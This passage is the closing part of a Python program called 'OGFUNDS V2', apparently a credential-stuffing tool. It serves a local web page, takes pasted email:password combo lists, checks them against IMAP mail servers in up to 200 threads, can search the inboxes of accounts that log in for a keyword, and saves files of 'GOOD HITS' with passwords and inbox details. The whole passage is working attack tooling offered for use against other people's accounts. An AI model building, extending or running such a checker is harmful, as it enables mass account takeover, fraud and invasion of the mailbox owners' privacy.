    document.getElementById('pctNum').textContent='0%';
    document.getElementById('statusLog').innerHTML='<div class="log-entry log-info">● System ready. Paste combos and start scan.</div>';
    document.getElementById('startBtn').disabled=false;
    document.getElementById('stopBtn').disabled=true;
    document.getElementById('saveGoodBtn').disabled=true;
    document.getElementById('saveBadBtn').disabled=true;
    document.getElementById('currentInfo').style.display='none';
    log('● Cleared','log-info');
}}
</script>
</body>
</html>"""


# ===================== HTTP HANDLER =====================
class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path

        if path == "/":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(get_html().encode("utf-8"))

        elif path == "/api/state":
            self.send_json(scan_state)

        elif path == "/api/save/good":
            self.save_results(good=True)

        elif path == "/api/save/bad":
            self.save_results(good=False)

        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"404")

    def save_results(self, good=True):
        results = scan_state["results"]
        label = "GOOD" if good else "BAD"
        fname = f"OGFUNDS_{label}.txt"

        if good:
            filtered = [r for r in results if r["status"] == "VALID"]
        else:
            filtered = [r for r in results if r["status"] != "VALID"]

        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        lines = []
        lines.append("╔" + "═" * 66 + "╗")
        lines.append(f"║{' OGFUNDS V2 — ' + label + ' HITS':^66}║")
        lines.append("╠" + "═" * 66 + "╣")
        lines.append(f"║  {ts}".ljust(67) + "║")
        lines.append(f"║  Total {label.lower()}: {len(filtered)}".ljust(67) + "║")
        lines.append("╚" + "═" * 66 + "╝")
        lines.append("")

        for i, r in enumerate(filtered, 1):
            lines.append("─" * 66)
            lines.append(f" #{i}  {r['icon']}  {r['status']}")
            lines.append(f"     Email:    {r['email']}")
            lines.append(f"     Password: {r['password']}")
            lines.append(f"     Provider: {r['provider']}")
            lines.append(f"     Webmail:  {r['webmail']}")
            if r.get("error"): lines.append(f"     Error:    {r['error']}")
            if r.get("inbox") and len(r["inbox"]) > 0:
                lines.append(f"     📬 INBOX ({len(r['inbox'])}):")
                for j, em in enumerate(r["inbox"], 1):
                    lines.append(f"        [{j}] From: {em['from']}")
                    lines.append(f"            Subj: {em['subject']}")
                    lines.append(f"            Date: {em['date']}")
            lines.append("─" * 66)
            lines.append("")

        content = "\n".join(lines)

        # Also save to disk
        try:
            with open(fname, "w", encoding="utf-8") as f:
                f.write(content)
        except:
            pass

        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Disposition", f'attachment; filename="{fname}"')
        self.end_headers()
        self.wfile.write(content.encode("utf-8"))

    def do_POST(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path

        if path == "/api/start":
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode("utf-8")
            data = json.loads(body)
            combos = parse_combos(data.get("combos", ""))
            if not combos:
                self.send_json({"error": "No valid combos"})
                return
            if scan_state["running"]:
                self.send_json({"error": "Already running"})
                return

            search_flag = data.get("search", False)
            keyword = data.get("keyword", "")
            threads = min(int(data.get("threads", 50)), 200)

            scan_state["running"] = True
            scan_state["results"] = []
            scan_state["total"] = len(combos)
            scan_state["completed"] = 0
            scan_state["valid"] = 0
            scan_state["current"] = None
            scan_state["cancelled"] = False

            def run():
                try:
                    with ThreadPoolExecutor(max_workers=threads) as ex:
                        futures = {ex.submit(check_one, e, p, search_flag, keyword): (e, p) for e, p in combos}
                        for f in futures:
                            if scan_state["cancelled"]: break
                            try:
                                r = f.result()
                                scan_state["results"].append(r)
                                scan_state["completed"] += 1
                                if r["status"] == "VALID": scan_state["valid"] += 1
                                scan_state["current"] = r["email"]
                            except: pass
                finally:
                    scan_state["running"] = False
                    scan_state["current"] = None

            threading.Thread(target=run, daemon=True).start()
            self.send_json({"total": len(combos)})

        elif path == "/api/stop":
            scan_state["cancelled"] = True
            scan_state["running"] = False
            self.send_json({"stopped": True})

        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"404")

    def send_json(self, obj):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(json.dumps(obj).encode("utf-8"))

    def log_message(self, format, *args):
        pass


# ===================== MAIN =====================
if __name__ == "__main__":
    print()
    print("  ╔══════════════════════════════════════════════════╗")
    print("  ║              O G F U N D S   V 2                ║")
    print("  ║       USA · UK · AU · CA  IMAP CHECKER          ║")
    print("  ║                                                 ║")
    print("  ║   💾 GOOD → OGFUNDS_GOOD.txt                    ║")
    print("  ║   💾 BAD  → OGFUNDS_BAD.txt                     ║")
    print("  ║                                                 ║")
    print("  ║   Opening in your browser...                     ║")
    print("  ╚══════════════════════════════════════════════════╝")
    print()

    def open_browser():
        time.sleep(1.2)
        webbrowser.open(f"http://127.0.0.1:{PORT}")

    threading.Thread(target=open_browser, daemon=True).start()

    with socketserver.ThreadingTCPServer(("127.0.0.1", PORT), Handler) as httpd:
        print(f"  🌐  http://127.0.0.1:{PORT}")
        print(f"  📁  Close this window to stop.\n")
        httpd.serve_forever()
